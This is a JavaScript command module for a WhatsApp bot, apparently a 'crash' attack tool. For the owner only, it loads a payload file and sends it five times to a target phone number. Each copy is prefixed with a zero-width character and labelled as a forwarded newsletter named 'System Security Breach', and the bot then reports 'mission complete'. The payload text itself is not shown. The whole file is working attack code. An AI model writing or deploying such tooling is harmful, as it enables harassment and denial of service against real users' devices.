const fs = require('fs');
const config = require('../../config');
const { fancy } = require('../../lib/tools');

module.exports = {
    name: "crush1",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        if (!args[0]) return msg.reply(fancy("🥀 ᴘʀᴏᴠɪᴅᴇ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ."));

        const payload = fs.readFileSync('./lib/payloads/crush1.txt', 'utf-8');
        msg.reply(fancy("🥀 ɪɴɪᴛɪᴀᴛɪɴɢ ɪɴᴠɪꜱɪʙʟᴇ ꜱᴛʀɪᴋᴇ..."));

        for (let i = 0; i < 5; i++) {
            await conn.sendPresenceUpdate('recording', target);
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: { 
                        newsletterJid: config.newsletterJid, 
                        newsletterName: "ꜱʏꜱᴛᴇᴍ ꜱᴇᴄᴜʀɪᴛʏ ʙʀᴇᴀᴄʜ" 
                    }
                } 
            });
        }
        // Report to Owner
        await conn.sendMessage(conn.user.id, { text: fancy(`🥀 ᴍɪꜱꜱɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ: ᴄʀᴜꜱʜ1 ᴅᴇᴘʟᴏʏᴇᴅ ᴛᴏ ${args[0]}`) });
    }
};
